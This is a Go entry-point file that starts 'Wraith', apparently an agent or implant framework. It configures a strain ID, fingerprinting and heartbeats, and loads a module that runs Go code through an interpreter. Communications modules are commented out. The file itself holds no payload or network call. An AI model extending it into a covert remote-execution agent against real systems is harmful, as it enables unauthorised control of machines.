package main

import (
	"context"
	"os"
	"os/signal"
	"syscall"
	"time"

	"git.0x1a8510f2.space/0x1a8510f2/wraith/wraith/libwraith"
	"git.0x1a8510f2.space/0x1a8510f2/wraith/wraith/stdmod"

	// This is here temporarily while I work on the modules which use these
	// TODO
	_ "github.com/pascaldekloe/jwt"
	_ "github.com/traefik/yaegi/interp"
	_ "github.com/traefik/yaegi/stdlib"
)

const RESPECT_EXIT_SIGNALS = true

var exitTrigger chan struct{}

func setupCloseHandler(triggerChannel chan struct{}) {
	c := make(chan os.Signal, 2)
	signal.Notify(
		c,
		syscall.SIGHUP,
		syscall.SIGINT,
		syscall.SIGQUIT,
		syscall.SIGTERM,
	)
	if RESPECT_EXIT_SIGNALS {
		go func() {
			for range c {
				triggerChannel <- struct{}{}
			}
		}()
	}
}

func init() {
	exitTrigger = make(chan struct{})
	setupCloseHandler(exitTrigger)
}

func main() {
	// Create Wraith
	w := libwraith.Wraith{}

	// Create context for Wraith
	ctx, ctxCancel := context.WithCancel(context.Background())

	// Start Wraith in goroutine
	go w.Spawn(
		ctx,
		libwraith.Config{
			StrainId:                   "none",
			FingerprintGenerator:       func() string { return "none" },
			HeartbeatTimeout:           1 * time.Second,
			ModuleCrashloopDetectCount: 3,
			ModuleCrashloopDetectTime:  30 * time.Second,
		},
		//&stdmod.JWTCommsManagerModule{},
		&stdmod.DebugModule{},
		&stdmod.ExecGoModule{},
	//	&stdmod.WCommsPinecone{},
	)

	// Wait until the exit trigger fires
	<-exitTrigger

	// Kill Wraith and exit
	ctxCancel()
	time.Sleep(1 * time.Second) // wait to make sure everything has cleaned itself up
}
